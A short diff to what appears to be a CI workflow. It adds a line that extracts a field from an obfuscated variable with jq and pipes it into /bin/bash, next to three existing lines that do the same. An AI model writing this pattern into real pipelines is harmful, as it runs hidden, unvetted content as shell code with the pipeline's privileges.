@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$yeth87874" | jq -r .c20 | /bin/bash
           printf '%s' "$t5212" | jq -r .n96 | /bin/bash
           printf '%s' "$h7506" | jq -r .libmj20 | /bin/bash
+          echo $dmmtc844 | jq -r .sbgq796 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
